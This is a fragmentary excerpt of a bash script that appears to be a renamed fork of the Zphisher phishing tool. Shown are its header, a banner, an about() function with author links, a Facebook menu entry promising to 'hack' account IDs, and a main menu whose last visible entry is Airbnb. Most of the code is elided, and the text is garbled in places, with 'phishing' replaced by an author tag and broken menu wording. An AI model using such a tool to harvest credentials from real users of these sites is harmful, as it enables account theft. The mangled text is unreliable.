...
##   69phisher 	: 	Automated devi&ayyat Tool
##   Author 	: 	Ayyat 
##   Version 	: 	3.0
##   Github 	: 	https://github.com/devixayyat
## Modified version of :
##   Zphisher 	: 	Automated Devi&ayyat Tool
##   Author 	: 	Devi
##   Version 	: 	3.0
##   Github 	: 	https://github.com/devixayyat  
...
${ORANGE}   _____             _                                _   
${ORANGE}  |  __ \           (_) ___                          | |  
${ORANGE}  | |  | | _____   ___ ( _ )   __ _ _   _ _   _  __ _| |_ 
${ORANGE}  | |  | |/ _ \ \ / / |/ _ \/\/ _` | | | | | | |/ _` | __|
${ORANGE}  | |__| |  __/\ V /| | (_>  < (_| | |_| | |_| | (_| | |_ 
${ORANGE}  |_____/ \___| \_/ |_|\___/\/\__,_|\__, |\__, |\__                                    __/ | __/ |          
 ${ORANGE}                                   |___/ |___/           
...
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANGE}Devi & ayyat
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/devixayyat
		${GREEN}Social   ${RED}:  ${CYAN}https://www.facebook.com/profile.php?id=100036118653131
...
site_facebook() {
	cat <<- EOF
		...
		${RED}[${WHITE}03${RED}]${ORANGE} Facbook id opend hack os Time howa gi jab devi aya gya
...
main_menu() {
	...
	cat <<- EOF
		...
		${RED}[${WHITE}34${RED}]${ORANGE} Airbnb
